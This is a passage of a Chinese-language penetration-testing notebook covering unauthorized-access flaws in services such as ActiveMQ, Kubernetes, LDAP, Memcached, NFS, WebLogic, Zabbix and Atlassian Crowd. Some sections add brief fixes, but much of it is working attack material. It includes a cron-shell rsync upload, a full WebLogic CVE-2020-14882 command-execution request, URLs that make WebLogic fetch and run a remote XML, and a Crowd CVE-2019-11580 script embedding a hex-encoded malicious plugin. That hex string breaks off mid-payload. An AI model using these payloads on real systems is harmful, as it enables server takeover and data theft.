rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell
```

  

### **3.20、apache active 未授权访问漏洞**

**简介：**是一款流行的开源消息服务器。默认情况下，ActiveMQ 服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。有的时候未有身份校验，可直接访问到后台；有身份校验，可尝试默认口令：admin/admin。

后台页面：

![图片](assets/1710814131-0d9d2e3b0451d685ba851e0fa9d3c18d.png)

  

**漏洞利用：**

获取到后台权限后，可尝试 CVE-2015-5254、CVE-2016-3088、CVE-2022-41678 和 CVE-2023-46604。

**参考地址：**

```plain
https://github.com/vulhub/vulhub/tree/master/activemq
```

  

### **3.21、Dubbo 未授权访问漏洞**

**简介：**Dubbo 是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring 框架无缝集成。dubbo 因配置不当导致未授权访问漏洞。

**漏洞利用：**

连接进入 dubbo 服务，进行操作

```plain
telent IP port
```

![图片](assets/1710814131-3b8e024d4fd6fb9ad5814ab042def854.png)

  

**参考地址：**

```plain
https://icybersec.gitbook.io/cybersecuritynote/an-quan-lou-dong/wei-shou-quan-lou-dong/dubbo-wei-shou-quan-fang-wen-lou-dong
```

  

### **3.22、Jupyter Notebook 未授权访问**

简介：Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。如果管理员未为 Jupyter Notebook 配置密码，将导致未授权访问漏洞，游客可在其中创建一个 console 并执行任意 Python 代码和命令。

**漏洞利用：**  

访问 web 管理界面

![图片](assets/1710814131-fbb4ff9a777fc5d3c6de694af9792c03.png)

  

选择 new -> terminal 即可创建一个控制台：

![图片](assets/1710814131-2730929b9baf122d7330bab340290f4e.png)

  

执行命令：

![图片](assets/1710814131-288209d6bfa090a12e3d13a064baa68e.png)

  

**修复方案：**

```plain
开启身份验证，防止未经授权用户访问；
访问控制策略，限制IP访问，绑定固定IP；
```

  

### **3.23、Kubernetes Api Server 未授权**

**简介：**Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认 8080）、Secure Port （默认 6443）。这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限。

**漏洞利用：**

```plain
/pods
获取环境变量、运行的容器信息、命名空间等信息。
/runningpods
获取运行中的pods
/ui
获取api的仪表盘
/
直接获取api接口的
```

获取 api 接口：

![图片](assets/1710814131-215b53e7ca46b4cb740408d72bb046bb.png)

  

获取 API 仪表盘：

![图片](assets/1710814131-fd088b4ce3779cee5ee67884f0e65592.png)

  

获取运行中的 pods

![图片](assets/1710814131-459cdf2c12c21fc7a15d43135908cca8.png)

  

**参考文章：**

```plain
浅析K8S各种未授权攻击方法
https://zone.huoxian.cn/d/1153-k8s
```

  

### **3.24、ldap 未授权访问漏洞**

简介：LDAP 中文全称为：轻型目录访问协议（Lightweight Directory AccessProtocol），默认使用 389， LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对 LDAP 的访问进行密码验证，导致未授权访问。

**漏洞检测及利用：**

1）python（未测试）

```plain
#!/usr/bin/env python
# encoding: utf-8
# [url]http://ldap3.readthedocs.io/tutorial.html#accessing-an￾ldap-server[/url]
import ldap3,os,sys,codecs
from exceptions import Exception
reload(sys)
sys.setdefaultencoding('gbk')
IpFile=file('./ldap1.txt') #IP列表
fp= codecs.open("./ldap1_success.txt","a") #成功利用后写入的文件，支
持写入中文字符的方式
timeout=10
def check(host,port):
try:
print "[*]%s:%d" %(host,port)
info=''
server = ldap3.Server(host,port, get_info=ldap3.ALL,
connect_timeout=timeout)
conn = ldap3.Connection(server, auto_bind=True)
print "[*]server=%s" %server
#print "[*]conn=%s" %conn
'''if len(server.info.naming_contexts) > 0:
print "[*]server.info.naming_contexts=%s" %
(server.info.naming_contexts)
for i in server.info.naming_contexts:
if "o=services" in i:
naming_contexts = i.encode('utf8')
info += u'%s:%d //存在ldap匿名访问漏洞:\n' %
(host,port)
print info+'\n'
fp.write(info)
fp.flush()'''
if len(server.info.naming_contexts) > 0:
#print conn.result
info += u'%s:%d //存在ldap匿名访问漏洞:\n' %
(host,port)
print info+'\n'
fp.write(info)
fp.flush()
else:
info += u'%s:%d //不存在ldap匿名访问漏洞:\n' %
(host,port)
print info+'\n'
except Exception, e:
print "Exception:%s\n" %e
pass
if __name__ == '__main__':
ip_list = []
print u'''
-------------------------------------------------------------
---------------------------
程序名称：ldap匿名访问检测脚本 ldap2018.py
程序作者：pt007@vip.sina.com
程序用法：
\tldap1.txt里面设置需要扫描的IP地址，如:10.110.123.30:389 回车后输
入下一个IP地址!
\tpython ldap2018.py
-------------------------------------------------------------
----------------------------\n'''
ip_list=[]
print "[*]ldap ip list:",
while True:
line = IpFile.readline()
if len(line) == 0: # Zero length indicates EOF
break
#exit()
line=line.strip()
print line,
ip_list.append(line)
IpFile.close()
print "\n"
for i in ip_list:
host,port=i.split(":")
check(host,int(port))
fp.close()
print "[*]Test done,please type ldap1_success.txt!\n"
```

  

2）nmap：

```plain
1）探测端口情况
nmap -p 389,1389 -iL ips.txt -o ips_res.txt
注：扫描状态为open的都可以试试
PORT STATE SERVICE VERSION
389/tcp open ldap OpenLDAP 2.2.X - 2.3.X

2）探测是否存在未授权
nmap -p 389,1389 --script ldap-rootdse -iL ips.txt -o ips_res.txt
```

  

存在未授权截图示意：

![图片](assets/1710814131-c9fa2bf9740d04479ccfc28b6bc2dbce.png)

  

3）msf

![图片](assets/1710814131-09d5e97dfd161156afaf283348b06838.png)

  

**参考文章：**

```plain
https://blog.csdn.net/qq_45300786/article/details/119784338
```

  

**防御措施：**

```plain
修改ldap配置文件，禁止匿名访问。
设置内网ACL规则，仅允许白名单地址访问ldap服务器。
```

  

### **3.25、Memcached 未授权访问漏洞**

**简介：**Memcache 是临时数据存储服务，以 key-value 存储格式存储数据，通过将数据块存储在缓存中，可以提高网站的整体性能，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。但由于 memcached 安全设计缺陷，默认的 11211 端口不需要密码即可访问，导致攻击者可直接链接 memcache 服务的 11211 端口获取数据库中信息，这可造成严重的信息泄露。

**漏洞利用：**

nmap

```plain
nmap -sV -p 11211 –script memcached-info <target>
```

telnet 探测：  

```plain
telnet 1.1.1.1 11211

操作指令
stats        //返回统计信息例如 PID(进程号)、版本号、连接数等
stats items  //查看缓存
stats cachedump 3 0 //表示读取缓存key
get value //读取敏感信息

更多memcached命令参考：https://www.runoob.com/memcached/memcached-stats.html
```

  

查看状态：

![图片](assets/1710814131-8df9ac40e8a794ccca3a883e3c22a350.png)

  

读取缓存 key

![图片](assets/1710814131-4fc0b42c8185925e91ddd76819e6de8e.png)

  

**参考文章：**

```plain
Memcache未授权访问漏洞利用及修复
https://blog.csdn.net/chest_/article/details/105808673
```

###   

### **3.26、NFS 未授权访问漏洞**

简介：NFS（Network File System）是一种网络文件系统，允许在不同的网络主机上共享文件。当 NFS 服务器未正确配置或缺少访问控制机制时，可能存在未授权访问漏洞。攻击者可以利用此漏洞访问受影响主机上的文件和数据，甚至可以修改或删除敏感信息。

**检查和利用：**

```plain
# 检查是否存在该漏洞
1）showmount
showmount -e
Export list for localhost.localdomain:
/ *

2）nmap：
nmap --script nfs-showmount <ip>

3）rpcinfo
rpcinfo -p <host_ip>



# 客户端挂载
mkdir /tmp/test
mount -t nfs 192.168.32.183:/ /tmp/test



# 查看文件，如果出现预期的目录，则漏洞利用成功
ls /tmp/test
```

  

利用示意图 - nmap

![图片](assets/1710814131-5d99952c53b7e12f75eedac39fc349a4.png)

  

rpcinfo 利用

```plain
[root@localhost tmp]# rpcinfo -p 192.168.32.183
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100024    1   udp  38880  status
    100005    2   tcp  20048  mountd
    100024    1   tcp  60551  status
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100227    3   udp   2049  nfs_acl
    100021    1   udp  48592  nlockmgr
    100021    3   udp  48592  nlockmgr
    100021    4   udp  48592  nlockmgr
    100021    1   tcp  42350  nlockmgr
    100021    3   tcp  42350  nlockmgr
    100021    4   tcp  42350  nlockmgr
```

  

**参考文章：**

```plain
NSF未授权访问漏洞/共享文件目录数据信息泄露
https://blog.csdn.net/weixin_38896449/article/details/114026277

NFS未授权访问漏洞
https://icybersec.gitbook.io/cybersecuritynote/an-quan-lou-dong/wei-shou-quan-lou-dong/nfs-wei-shou-quan-fang-wen-lou-dong
```

  

### **3.27、RabbitMQ 未授权访问**

**简介：**RabbitMQ 是目前非常热门的一款消息中间件，基于 AMQP 协议的，可以在发布者和使用者之间交换异步消息。消息可以是人类可读的 JSON，简单字符串或可以转换为 JSON 字符串的值列表。

```plain
常见端口是：15672、15692、25672
默认口令：admin/admin、guest/guest
```

应用页面：

![图片](assets/1710814131-b8372e51df0bc52311c6ce114774a52f.png)

  

**修复措施：**

```plain
修改admin口令为强密码，删除默认的账号guest；
禁止对外网开放，仅限于内部访问；
```

  

### **3.28、apache solr 未授权访问漏洞**

**简介：**Solr 是一个高性能，采用 Java 开发，基于 Lucene 的全文搜索服务器。solr 的管理界面通常包含如下信息：solr 的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr 未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至 getshell。

应用页面：

![图片](assets/1710814131-d3520d13cb873129b8beffd21789a7b3.png)

  

漏洞利用：

```plain
https://github.com/vulhub/vulhub/tree/master/solr
```

![图片](assets/1710814131-372ea6b9827d577806affb5e11426034.png)

  

### **3.29、weblogic 未授权访问漏洞**

简介：Weblogic 是 Oracle 公司推出的 J2EE 应用服务器。在 2020 年 10 月的更新中，Oracle 官方修复了两个长亭科技安全研究员 @voidfyoo 提交的安全漏洞，分别是 CVE-2020-14882 和 CVE-2020-14883。

CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个 GET 请求在远程 Weblogic 服务器上以未授权的任意用户身份执行命令。

漏洞页面

![图片](assets/1710814131-dff88808ff71c8789ed59b4a74d17297.png)

  

**前提：**访问以下 URL，即可未授权访问到管理后台页面：

```plain
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal
```

  

#### **1）控制台执行命令**

```plain
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: 172.17.54.87:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: ADMINCONSOLESESSION=HJ03EL7PlMBzyOqzZsORij_ZDYmYGMtesy4S3d9lnl97fMNRGc1e!1616298239; zbx_sessionid=404e7d11cab0215a7536f7281c8b17fe; PHPSESSID=sfl1tghgbikhi9pso30d3tes64
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1221
cmd: id

_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");
```

![图片](assets/1710814131-53160ed35930eef787ce7f029a4e9c52.png)

  

exp 脚本：

```plain
https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2020-14882_rce.py
```

  

#### **2）com.tangosol.coherence.mvel2.sh.ShellSession**

直接访问如下 URL，即可利用 com.tangosol.coherence.mvel2.sh.ShellSession 执行命令：

```plain
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")
```

进入容器，可以发现 touch /tmp/success1 已成功执行：  

![图片](assets/1710814131-37d80127b73f829661c0d17b431e0b18.svg)

  

这个利用方法只能在 Weblogic 12.2.1 以上版本利用，因为 10.3.6 并不存在 com.tangosol.coherence.mvel2.sh.ShellSession 类。

  

#### **3）com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext**

构造一个 XML 文件，并将其保存在 Weblogic 可以访问到的服务器上，如：

```plain
http://example.com/rce.xml
```

```plain
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[touch /tmp/success2]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

然后通过如下 URL，即可让 Weblogic 加载这个 XML，并执行其中的命令：

```plain
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://example.com/rce.xml")
```

![图片](assets/1710814131-29b44e341bf0d6044ca0e74035658c18.png)

  

**注：**com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext 是一种更为通杀的方法，最早在 CVE-2019-2725 被提出，对于所有 Weblogic 版本均有效。

同样可更改 xml 文件实现文件写入的效果：

```plain
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[echo hello > "../../../wlserver/server/lib/consoleapp/webapp/images/xxx.jsp"]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

![图片](assets/1710814131-e3e77b7c150bcc6c1c0dbc650048c641.png)

  

  

另一种文件写入的方法：

```plain
http://192.168.3.136:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://192.168.3.1/poc.xml")
```

**参考地址：**

```plain
https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md
【漏洞复现】Weblogic漏洞复现：CVE-2020-14882未授权代码执行
https://cloud.tencent.com/developer/article/1745180
```

  

### **3.30、zabbix 未授权访问漏洞**

**简介：**Zabbix 是一款可监控网络的众多参数以及服务器、虚拟机、应用程序、服务、数据库、网站、云等的健康状况和完整性。Zabbix 使用灵活的通知机制，允许用户为几乎任何事件配置基于电子邮件的警报。这允许对服务器问题做出快速反应。Zabbix 基于存储的数据提供报告和数据可视化功能。这使得 Zabbix 成为容量规划的理想选择。

业务页面：

![图片](assets/1710814131-8349d365cdadf931ba5c3f44e8c96634.png)

  

影响版本：Zabbix <= 4.4

环境搭建：

```plain
cd zabbix/CVE-2016-10134
docker-compose up -d
```

访问：

```plain
http://1.1.1.1/zabbix.php?action=problem.view&ddreset=1
```

![图片](assets/1710814131-5927e034e8aa9a444899fad781ed3ffa.png)

  

访问：

```plain
http://1.1.1.1/overview.php?ddreset=1
```

![图片](assets/1710814131-8b69a9836d60a35fee84b6bfca5ca7f6.png)

  

访问：

```plain
http://1.1.1.1/latest.php?ddreset=1
```

![图片](assets/1710814131-1c371896e43bff8c57f3b8e2c1e79cb2.png)

  

其他可访问的链接：  

```plain
https://TARGET/zabbix/zabbix.php?action=dashboard.view
https://TARGET/zabbix/zabbix.php?action=dashboard.view&ddreset=1
https://TARGET/zabbix/zabbix.php?action=problem.view&ddreset=1
https://TARGET/zabbix/overview.php?ddreset=1
https://TARGET/zabbix/zabbix.php?action=web.view&ddreset=1
https://TARGET/zabbix/latest.php?ddreset=1
https://TARGET/zabbix/charts.php?ddreset=1
https://TARGET/zabbix/screens.php?ddreset=1
https://TARGET/zabbix/zabbix.php?action=map.view&ddreset=1
https://TARGET/zabbix/srv_status.php?ddreset=1
https://TARGET/zabbix/hostinventoriesoverview.php?ddreset=1
https://TARGET/zabbix/hostinventories.php?ddreset=1
https://TARGET/zabbix/report2.php?ddreset=1
https://TARGET/zabbix/toptriggers.php?ddreset=1
https://TARGET/zabbix/zabbix.php?action=dashboard.list
https://TARGET/zabbix/zabbix.php?action=dashboard.view&dashboardid=1
```

  

### **3.31、CouchDB 未授权访问漏洞**

简介：是一个开源数据库，默认会在 5984 端口开放 Restful 的 API 接口，如果使用 SSL 的话就会监听在 6984 端口，用于数据库的管理功能。

**漏洞利用：**

访问 5984 端口，就可以看到版本信息

![图片](assets/1710814131-ab74986692ec5ceb6ebb03c83922f67b.png)

  

访问 /\_config 接口，可以看到 couchDB 配置信息。

![图片](assets/1710814131-88687a6adcc74ecafc0fa8f678e396a9.png)

  

### **3.32、Atlassian Crowd 未授权访问**

**简介：**Atlassian Crowd Data Center 是 Crowd 的集群部署版。Atlassian Crowd 和 Crowd Data Center 在其某些发行版本中错误地启用了了 pdkinstall 开发插件，使其存在安全漏漏洞洞。攻击者利用该漏洞可在未授权访问的情况下对 Atlassian Crowd 和 Crowd Data Center 安装任意的恶意插件，执行任意代码 / 命令，从而获得服务器权限。

影响版本：

```plain
2.1.0 <= version < 3.0.5
3.1.0 <= version < 3.1.6
3.2.0 <= version < 3.2.8
3.3.0 <= version < 3.3.5
3.4.0 <= version < 3.4.4
```

  

**漏洞利用：**

利用脚本：

```plain
import requests
import sys

banner = '''\n   _______      ________    ___   ___  __  ___        __ __ _____  ___   ___
  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \      /_ /_ | ____|/ _ \ / _ \
 | |     \ \  / /| |__ ______ ) | | | || | (_) |______| || | |__ | (_) | | | |
 | |      \ \/ / |  __|______/ /| | | || |\__, |______| || |___ \ > _ <| | | |
 | |____   \  /  | |____    / /_| |_| || |  / /       | || |___) | (_) | |_| |
  \_____|   \/   |______|  |____|\___/ |_| /_/        |_||_|____/ \___/ \___/

\n
                  python CVE-2019-11580.py http://xx.xx.xx.xx\n
'''
print banner






def is_url(url):
    upload_url = url + "/crowd/admin/uploadplugin.action"
    r = requests.get(upload_url, verify=False)
    if r.status_code==400:
        print upload_url
        send_poc(url)
    else:
        print "No Exit /crowd/admin/uploadplugin.action !"

def send_poc(url):
    url_vuln = url + "/crowd/admin/uploadplugin.action"
    headers = {
    'User-Agent': 'curl/7.29.0',
    'Accept': '*/*',
    'Content-Length': '5739',
    'Expect': '100-continue',
    'Content-Type': 'multipart/mixed; boundary=----------------------------f15fe87e95a7'
    }
    s ="2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d6631356665383765393561370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c655f63646c223b2066696c656e616d653d227263652e6a6172220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a504b03041400000008007c7ef14e544c2527eb0000000402000014001c0061746c61737369616e2d706c7567696e2e786d6c55540900039bd32e5da8d32e5d75780b0001040000000004000000007d91416ec3201045d7ce29107b20c91a23e50039c4044f53140c16e0a8bd7d260527ae5595dd7c66febc0f1a8a879c1d0431f9f9ea02bbe177cf6d1ca51dbccc9fe8bdc4af89b30023f6fcb4b4b33304b862e2acce6571c7945d0c3d3f72669f5d7fd9981da3a3eb8c70e12356a5aa90606c8bde5c0314101643c124c87082e22e1eb9296946ad7e66561e03669bdc5488c46c61473269b85aad1bdfe32d8439c8bddc6bb594955afdc2de753a63ba7b2c0d99f2f9e80aaf4ff8aafe798beee93a272f2814c50b4691aed55aa93d6bd80bd8db106362505823caaa9128dab089d6e9e59290b5dafe37890f504b03040a00000000001b7ff14e00000000000000000000000004001c00636f6d2f5554090003c6d42e5dc9d42e5d75780b000104000000000400000000504b03040a00000000001b7ff14e00000000000000000000000008001c00636f6d2f63646c2f5554090003c6d42e5dc9d42e5d75780b000104000000000400000000504b03040a0000000000d07df14e0000000000000000000000000e001c00636f6d2f63646c2f7368656c6c2f555409000357d22e5d59d22e5d75780b000104000000000400000000504b03041400000008008878f14ec2481cb07d0100008d03000016001c00636f6d2f63646c2f7368656c6c2f43646c2e6a61766155540900036fc82e5dbdc82e5d75780b0001040000000004000000008d934d4fc3300c86effd15a617523e22384f3d21049c400c890b97909a35903621714711da7fc75187e8b60ee14395da799fbcb15baff49b5a2068d7485d59196bb4769665a6f12e10bcaaa5ea65c4b0b448b226f2f268362e4ae3e44deb3b9a5340d5b0d277cfd668d056c508179505ec09db2a4eb1aef9311f12f09565c0b1962f9da9a072574862b4e91edf3b8c0401df4f60231fbd6b237221164c827550f81cbda5609ba65d806eaa7258caa5b21ddebe0866ca05d29d0aaa41c220f28ba6ca8b6236a5771df19dcb3cdfacee9e97c2bc8038e01325bb57368a9ca913db52dc05a791fbe6cbfbae25d360b2b45e8a42628f5a3069cbd44f8c06911c963ea94749f10f1d8630e82e4370e16f9d69097479f87476385dffa88d45104297ec4632a9127cf383124ecff73520050f3119780c268da1901f69c1945a8542efb1b2dac96e6656a015e95a5cf61a3d19d7f26739e56118ec71993fb5f931f692dc30f1ed16fcd227c8db60949e19dc61fed91e82d238a60da45596adb26f504b030414000000080085b2f04ecafaf82fe50000000418000017001c00636f6d2f63646c2f7368656c6c2f2e44535f53746f726555540900031add2d5d09df2d5d75780b000104000000000400000000ed98316ec2401045ff382e564ab365ca2da922e5062b0305752e100815b2e42aa95d71176ec1cdc0667e0292b1945444e13f69f40acf8cd7cdee8e0158f5b17e0122800037b6b84a600c2868f3e87a6cb0c427968bba79bfde6b809d9a4fb1468de7cbfa55ddacb8b05d1793c3891f7615420821c418e60a8fb75d8610e20fd2ef0f89ce74eb363e2fe8f2a226d289ce74eb36e6157449073ad289ce74ebe6a6651c3e8c6f364e2816e944e75f7db21077c3832bf6e7ff1ca3f3bf10e21f63e5ec7556e17b2018d09fb5a98b37e6ecbf0a472e0285ff307cc2392fd1996eddba0c08710b8e504b0304140000000800b178f14ed0054a4648030000fa05000017001c00636f6d2f63646c2f7368656c6c2f43646c2e636c6173735554090003bdc82e5d09df2d5d75780b0001040000000004000000008d545d7b1345147e274d32dbedf62ba594fa010202295016152b2608d852a05ad2d214b0f8b9dd8c6571b39b6e26b5fa33bcf4c6cb5e7313409fc71fe02ff12f78637d674925ad7da479f63967e6cc39ef79cf999cf9e3ef5f7f077009be8d31142d4cf4e12cced9388f490b178c766d5cc43b46bc6be33d5c32e27d1b53f8a00f97f1a18d12ca1257243eb23188a211572d5cb33180eb6673ddac3e9698969811c85f09a2405f15e8294edc17c8cec4352530381f44aad2aaafaa64d95b0d69c9d5e25b4a0b2c15e71f7b1bdea6db54c946a8b4fb48eb867b9ba2fac2b0a4d65baaa9cbaf746b36e2a8a9ca266b7f557bfe7777bc469a2ca576436256e2a6c42d89db2c47c0aec6adc457370343c79aa985174c060747304ef633f51a831ccce1138639f814f302707007158905078bb8eb600955023a58c63d07f7718fd00e1ee033e672b08287129f3bf8025f0a8c186c37f4a2357776d3570d1dc491c0d84b6b552741b436dd0ac29a4a1c7c85af0584ede01b90d2aaa134ecc775d7af856ef3910a439784058efe7f53044e1da8b902a70fd65d81a1bd9449eca56931897dd56ceed41bc4ee5cd468697a2aaf2ee0ac29bde8255e5d699530e98bbbef462b4ffcd7242037bcb0a516bedd13b2b0fa58f97aff903c2bf3423219dd2fe2e12ed64bad480775166793dfbf9bd1623770c74ce4acda54bec0995790efb482010344ddd586b11de4ddfde9b8ce26499cecb866a96ae930cd09f4f2f44112a4bdebc65864f2ce41b9abf55d66cedbf76641c0e29c9990bcd768a888c89307ba83ceff92e8968e77eefd5071dfce0f364cde74029713cf57388ec37c7bcc2f0361c68bf235eedea4e64c2177f629c4132e045ea7cca74623df485de82a8a0ceda5f5c77385cc73f464f00cd94a2157ca4e16726de47fc6e56790936d58a5dc380dbda5bc517649f64c59e3f936fa56a6accc2f289c7f0e87376bfdd446ffd6f69f5b3859cafd86c195a7181acfb6315c285098d011ea360e95b25bb02a041e7d420643a8e02e1f3b601d9a3a93f29da61db0f936f471d5cff2067082efe204771731ccd7b4806b1861ec11461f4695cd5867a4a6678bd5fdc03a8f12e106f2db74ee953826f196c4718913e97752e26d7eecca36dd737bce615eb7537fe1985159f6eb74dae833ff00504b030414000000080080b2f04e5e4c2ce8970100000418000011001c00636f6d2f63646c2f2e44535f53746f726555540900030fdd2d5dc8c82e5d75780b000104000000000400000000ed98cf4e833018c0bf32a61063e460e28e5c4c3cecb0c5cd1d8c09c179d8cd04a387693618c491205d06932862780d7d239fc0c751fe7c1ad0ede06953fb4b9a5f295f5b0aa4a500005167661340020001727322cc45c0f40d0ecd2789646d383d878e0c871af35b62ac1ce9b3ab820763b0c0293dbff495384cd2de5b46165d8834026f82912fc6c4b13dbfd178255c85afaead0ba228889be29536a681e6ebfecc53f5693f3d3ad5fdb181f9334a9dcfbc6e9cdb563090b68fa9ebebb66b4db3cab66925219717b66bd240a533d7f4fa8513594703a91686ad76bb2eb7daada82e879d4e23c9ef1f449128ecec368f7ac39bbbfbf0217a7ccac74c080e7eebcbcd782e0fd1f4468e915c242917df6a53d7a1ee35646f3d83c160fc4270f61236967b190c06630549e70719ada0e3dc04cf7368be504742cb68051de72618c7a179b48096d0325a41c7b971d222b8f920d833c11d0a91d0325af9d190198c7f43259794aeff278bf7ff0c06e30f43f8aed65561f1ef8c74ad959334fca800e50f012ce331365d8a6b857219ada0e3dcec4380c15816ef504b030414000000080080b2f04e7261dc5f94010000041800000d001c00636f6d2f2e44535f53746f726555540900030fdd2d5dc8c82e5d75780b000104000000000400000000ed98cf4e833018c0bf32548831723071472e261e76d8e2e60ec684e03cec6632a3876936188b2341ba0c2651c4f01afa463e818fa3fcf9749bba83a7e9fc7e49f32be52b6d81b4140060fad8aa00280020416e41866f91307d41408b4962e93578cf74b8899723fe02e9b32b400f2c709aceccf33b48d2ee6b4616895166e00d31ead91c3ab6e797cb2f4c28882bab6b922c4bf2867cd91af0a0e51bfed8d38d513b3d3a31fc8189f953ce9d8fbc619ed9fda0a36c1d71d7376cb73fca2adb563f09b938b75d8b073a1fbb96d79e3a9135d4518a6158add54a6ab5568d4a6a58af9793fcde7e14c9d2f64ee5b0d9bdbebd0befa387c77cac8ce1a0373fdd84a7c9f02cafe7984907d9a4e8a635721dee5e41f6961304412c01389b49eb8bed064110bf90747e50d11a3acecdf0bc8016a7ea286815ada1e3dc0ce304b48896d00a5a456be838374e5a0c371f0c5b66b84361b8f5602a5afbd19009e2df50c8a5a4ebfff1fcfd3f41104b0c131bad860ef37f6fa46bad9aa4ee7b0598fd10c0321163d3a5b83855aea235749c9b3e04086251bc01504b0304140000000800b57df14ef98bc46d88010000c303000016001c00636f6d2f63646c2f7368656c6c2f6578702e6a617661555409000326d22e5d57d22e5d75780b0001040000000004000000008d53c14ee33010bde72b865c702818f65cf98880130856e2c2c5eb0c8dc1898d3d2941abfe3b63d2d5a66d58ed93123933f39edf4ceca0cdab5e2118df4a533b991a746e5914b60d3e12bce8b51e64c2b87648b2210af264394d4aebe54d177a7aa088ba6566e87f396bc0389d12e010f821ecea34a775cdaf873100bf8b02185bfadadb1a6a7f85242645f7f8d6632288f8760a3bf1147c979013a96225d882e2c7e42b836dda6e05a6add5b8946bed7abc7d16ac295748773aea1609a328b9a8acaae51cdff7c43dabb2dccd9e9fb381acf2186d96a8e47b5e7c492946098bbcf59ee6a1cb0cfb0ce2888b25f7ac5d12257b9929cbb88bde204f3ba8fbbe23db62b6b05db2071cd088c36dff60f2fb725f2a64f62428fe8387318ebccb187dfc37cf7604461d3f5d1ccfe7df1beb1084308add4856aa05777ea4e0ecc77703c8989fbc308d8e95f9c6cae620ba1bd980d1641a7139180c647dc78779cec3781c16aa7ceaca050e92fc784ef647f0577d46795f1865600d9e